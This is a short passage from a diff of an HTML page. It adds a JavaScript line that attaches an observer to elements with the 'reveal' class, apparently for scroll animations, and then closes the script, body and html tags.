+document.querySelectorAll('.reveal').forEach(el=>observer.observe(el));
+</script>
+</body>
+</html>
